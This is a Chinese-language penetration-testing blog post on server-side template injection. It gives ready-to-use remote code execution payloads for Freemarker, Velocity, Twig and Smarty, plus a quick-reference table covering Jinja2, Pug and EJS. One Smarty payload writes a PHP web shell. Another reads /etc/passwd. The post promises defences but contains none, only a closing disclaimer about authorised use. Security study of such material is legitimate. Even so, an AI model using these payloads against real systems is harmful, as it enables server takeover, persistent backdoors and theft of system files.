---
title: SSTI：Freemarker/Twig/Velocity/Smarty 利用
date: 2026-03-15 08:00:00
tags:
  - Web安全
  - 框架安全
  - 渗透测试
description: SSTI：Freemarker/Twig/Velocity/Smarty 利用——渗透测试实战笔记，含完整攻击链路与防御方案。
categories: 渗透测试
---

## Freemarker (Java)

```java
// 基础 RCE
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}

// ObjectConstructor（需要特定版本）
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","whoami").start()}

// JythonRuntime（虽少但有效）
<#assign jython="freemarker.template.utility.JythonRuntime"?new()>
${jython("__import__('os').popen('whoami').read()")}
```

**检测：** `${7*7}` 输出 49 = Freemarker。

---

## Velocity (Java)

```java
// #set + ClassTool
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('whoami'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

**检测：** `#set($x=7*7)$x` 输出 49。

---

## Twig (PHP)

```php
// registerUndefinedFilterCallback
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}

// displayBlock + eval
{{_self.env.getFilter('system')('id')}}

// 沙箱绕过——利用 PHP 原生函数
{{['whoami']|filter('system')}}
```

**检测：** `{{7*7}}` 输出 49 = Twig。

---

## Smarty (PHP)

```php
// 经典 RCE——已在新版中禁用
{php}echo shell_exec('whoami');{/php}

// system() 函数调用（如果未禁）
{system('whoami')}
{Smarty_Internal_Write_File::writeFile(['shell.php'],['<?php @eval($_POST[1]); ?>'])}

// 利用 fetch 函数读文件
{fetch file='file:///etc/passwd'}
```

**检测：** `{7*7}` 输出 49 = Smarty。

---

## 各引擎 Payload 速查

| 引擎 | 语言 | 检测 | RCE |
|------|------|------|-----|
| Jinja2 | Python | `{{7*7}}` | `''.__class__.__mro__[1].__subclasses__()` 链 |
| Freemarker | Java | `${7*7}` | `Execute"?new()("id")` |
| Velocity | Java | `#set($x=7*7)$x` | `ClassTool` + `Runtime.exec()` |
| Twig | PHP | `{{7*7}}` | `registerUndefinedFilterCallback("exec")` |
| Smarty | PHP | `{7*7}` | `{php}system('id');{/php}` |
| Jade/Pug | Node.js | `#{7*7}` | `#{global.process.mainModule.require('child_process').execSync('id')}` |
| EJS | Node.js | `<%= 7*7 %>` | `<%= process.mainModule.require('child_process').execSync('id') %>` |

---

> 本文仅用于授权安全测试与学习，请勿用于非法用途。
